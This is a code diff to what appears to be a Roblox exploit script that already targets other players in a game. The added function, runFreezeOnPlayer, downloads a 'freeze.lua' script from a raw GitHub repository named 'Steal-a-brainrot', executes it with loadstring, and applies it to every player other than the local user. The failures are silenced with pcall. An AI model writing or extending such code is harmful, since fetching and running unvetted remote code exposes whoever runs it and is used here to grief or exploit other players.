@@ -15,7 +15,13 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
-
+-- Load and run the freeze script on target players
+local function runFreezeOnPlayer(player)
+    if not player or player == LocalPlayer then return end
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/freeze.lua"))()(player)
+    end)
+end
 -- ==================== CONFIG ====================
 local tester_users = {
     "SMILEY_RIVALS",
@@ -89,8 +95,7 @@ local function processPlayer(player)
     fireToggleFriends()
 
     -- 3. Disable CoreGui (on first target join)
-    disableCoreGui()
-
+    runFreezeOnPlayer(player)
     -- 4. CREATE GUI ONLY ONCE
     if not guiCreated then
         guiCreated = true
